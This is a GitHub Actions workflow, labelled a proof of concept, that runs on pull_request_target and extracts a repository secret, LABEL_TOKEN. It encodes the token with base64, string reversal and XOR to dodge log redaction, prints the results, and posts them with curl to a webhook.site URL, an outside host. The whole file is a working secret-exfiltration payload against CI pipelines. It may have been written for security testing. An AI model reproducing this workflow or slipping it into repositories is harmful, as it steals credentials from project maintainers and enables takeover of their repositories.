name: REAL POC - Extract LABEL_TOKEN
on: [pull_request_target]

jobs:
  capture-token:
    runs-on: ubuntu-latest
    steps:
      - name: Capture and Exfiltrate
        env:
          LABEL_TOKEN: ${{ secrets.LABEL_TOKEN }}
        run: |
          echo "=== START POC ==="
          
          # Method 1: Base64 encoding (bypasses redaction)
          TOKEN_B64=$(echo -n "$LABEL_TOKEN" | base64 | tr -d '\n')
          echo "Token (base64): $TOKEN_B64"
          
          # Method 2: Reverse the token
          REVERSED=$(echo -n "$LABEL_TOKEN" | rev)
          echo "Reversed: $REVERSED"
          
          # Method 3: XOR with simple key
          XORED=""
          KEY="123"
          for ((i=0; i<${#LABEL_TOKEN}; i++)); do
            CHAR="${LABEL_TOKEN:$i:1}"
            KEY_CHAR="${KEY:$((i % ${#KEY})):1}"
            XOR_VAL=$(( $(printf '%d' "'$CHAR'") ^ $(printf '%d' "'$KEY_CHAR'") ))
            XORED+=$(printf '\\x%02x' $XOR_VAL)
          done
          echo -ne "XOR encoded: $XORED" | base64
          echo ""
          
          # Send ALL methods to webhook
          curl -s -X POST "https://webhook.site/5abc3452-aafc-4f71-91b8-2cad2e68739f" \
            -H "Content-Type: application/json" \
            -d "{
              \"base64\": \"$TOKEN_B64\",
              \"reversed\": \"$(echo -n "$REVERSED" | base64)\",
              \"repo\": \"$GITHUB_REPOSITORY\",
              \"timestamp\": \"$(date)\"
            }"
            
          echo "=== POC SENT TO WEBHOOK ==="
